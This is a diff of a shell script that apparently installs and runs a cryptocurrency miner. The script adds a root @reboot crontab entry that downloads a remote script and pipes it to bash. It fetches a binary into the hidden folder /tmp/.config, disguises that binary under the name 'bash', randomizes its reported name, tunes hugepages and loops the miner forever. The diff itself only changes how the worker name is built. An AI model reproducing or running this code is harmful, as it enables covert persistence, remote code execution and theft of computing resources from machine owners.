@@ -15,8 +15,6 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 [ -n "$cores" ] || cores=1
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
-rand=`RandString 2`
-[ -n "$rand" ] && rand="_${rand}" || rand=""
 
 if [ "$mode" == "1" ]; then
   [ "$cores" == "2" ] && cores="1";
@@ -26,7 +24,7 @@ fi
 sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
 sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
-name="c${cores}_${addr}${rand}"
+
 rm -rf "/tmp/.config"
 mkdir -p "/tmp/.config"
 wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
@@ -34,8 +32,9 @@ wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"
 
+
 if [ "$mode" == "0" ]; then
-  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
+  bash -c "while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
 else
-  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
+  while true; do cd /tmp/.config; name=`RandString 2 c${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
 fi
